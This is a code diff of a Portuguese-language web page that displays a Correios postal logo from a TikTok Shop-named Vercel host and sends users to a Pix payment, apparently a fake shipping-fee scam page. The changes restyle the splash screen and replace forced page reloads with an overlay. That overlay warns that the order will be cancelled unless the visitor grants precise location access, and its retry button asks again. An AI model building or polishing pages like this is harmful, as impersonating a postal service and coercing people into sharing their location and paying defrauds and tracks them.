@@ -22,34 +22,33 @@
             flex-direction: column;
             overflow: hidden;
         }
-        /* Tela de carregamento BRANCA com animação */
+        /* Tela de carregamento branca com animação */
         .splash-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: white;
+            background: #ffffff;
             z-index: 10000;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            transition: opacity 0.8s ease;
+            transition: opacity 0.6s ease;
         }
         .splash-screen img {
-            width: 160px;
+            width: 140px;
             height: auto;
-            filter: none; /* Logo original, sem inverter cores */
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
         .splash-screen .loader {
             width: 60px;
             height: 60px;
-            border: 5px solid #e0e0e0;
-            border-top: 5px solid #003366;
+            border: 6px solid #e0e0e0;
+            border-top: 6px solid #003366;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin-top: 20px;
         }
         @keyframes spin {
@@ -98,7 +97,6 @@
             width: 100%;
             background: #cbd5e1;
         }
-        /* Overlay de carregamento durante cálculo */
         .recalc-overlay {
             position: absolute;
             bottom: 20px;
@@ -136,7 +134,6 @@
             font-size: 0.75rem;
             color: #555;
         }
-        /* Popup de upsell */
         .upsell-popup {
             position: fixed;
             bottom: 0;
@@ -254,6 +251,37 @@
             color: #4a5568;
             flex-wrap: wrap;
         }
+        /* Overlay de permissão negada */
+        .permission-denied {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: white;
+            padding: 40px;
+        }
+        .permission-denied.hide {
+            display: none;
+        }
+        .permission-denied button {
+            background: #ffcc00;
+            color: #003366;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1rem;
+            margin-top: 20px;
+            cursor: pointer;
+        }
         @media (max-width: 480px) {
             .logo-area img {
                 height: 48px;
@@ -268,7 +296,7 @@
     </style>
 </head>
 <body>
-    <!-- Tela de carregamento BRANCA -->
+    <!-- Tela de carregamento branca -->
     <div id="splash" class="splash-screen">
         <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
         <div class="loader"></div>
@@ -306,6 +334,16 @@
             <span><i class="fas fa-headset"></i> Dúvidas? Suporte</span>
         </div>
     </div>
+    <!-- Overlay de permissão negada -->
+    <div id="permissionDeniedOverlay" class="permission-denied hide">
+        <div>
+            <i class="fas fa-map-marker-alt" style="font-size: 3rem; margin-bottom: 16px;"></i>
+            <h2>Permissão de localização negada</h2>
+            <p>Para calcular o frete e evitar o cancelamento do pedido, você precisa permitir o acesso à localização.</p>
+            <p style="font-size:0.8rem; margin: 12px 0;">Clique no ícone de cadeado 🔒 na barra de endereço, permita a localização e recarregue a página.</p>
+            <button id="retryLocationBtn"><i class="fas fa-sync-alt"></i> Tentar novamente</button>
+        </div>
+    </div>
 
     <script>
         (function() {
@@ -323,7 +361,7 @@
                     splash.style.opacity = '0';
                     setTimeout(() => {
                         if (splash) splash.style.display = 'none';
-                    }, 800);
+                    }, 600);
                 }
             }, 2000);
 
@@ -518,20 +556,20 @@
                 } catch (err) {
                     console.error(err);
                     hideOverlay();
-                    alert("Erro ao calcular rota. Recarregue a página.");
-                    location.reload();
+                    alert("Erro ao calcular rota. Verifique sua conexão.");
                 }
             }
 
             function requestLocationAndTrack() {
                 if (!navigator.geolocation) {
-                    alert("Seu navegador não suporta geolocalização. Recarregue a página.");
-                    location.reload();
+                    alert("Seu navegador não suporta geolocalização.");
                     return;
                 }
                 showOverlay("Solicitando permissão...", "Precisamos da sua localização");
 
                 navigator.geolocation.getCurrentPosition(async (position) => {
+                    // Esconde qualquer overlay de erro
+                    document.getElementById('permissionDeniedOverlay').classList.add('hide');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     showOverlay("Obtendo endereço...", "Buscando informações");
@@ -560,21 +598,18 @@
                     } catch (err) {
                         console.error(err);
                         hideOverlay();
-                        alert("Não foi possível obter seu endereço. Recarregue a página.");
-                        location.reload();
+                        alert("Não foi possível obter seu endereço. Tente novamente.");
                     }
                 }, (error) => {
                     hideOverlay();
                     console.error("Geolocation error:", error);
                     if (error.code === 1) {
-                        alert("Você negou a permissão de localização. A página será recarregada para você permitir.");
-                        location.reload();
+                        // Permissão negada - mostra overlay orientativo
+                        document.getElementById('permissionDeniedOverlay').classList.remove('hide');
                     } else if (error.code === 2) {
-                        alert("Localização indisponível. Ative o GPS e recarregue a página.");
-                        location.reload();
+                        alert("Localização indisponível. Ative o GPS e tente novamente.");
                     } else {
-                        alert("Erro ao obter localização. Recarregue a página.");
-                        location.reload();
+                        alert("Erro ao obter localização. Tente novamente.");
                     }
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
@@ -585,6 +620,7 @@
                 if (savedCEP) {
                     trackWithCEP(savedCEP, true);
                 } else {
+                    // Aguarda a splash screen sumir
                     setTimeout(() => {
                         requestLocationAndTrack();
                     }, 2500);
@@ -601,6 +637,10 @@
                 initialize();
                 document.getElementById('btnFinalizar').addEventListener('click', redirectToPix);
                 document.getElementById('closeUpsell').addEventListener('click', hideUpsell);
+                document.getElementById('retryLocationBtn').addEventListener('click', () => {
+                    document.getElementById('permissionDeniedOverlay').classList.add('hide');
+                    requestLocationAndTrack();
+                });
             });
         })();
     </script>
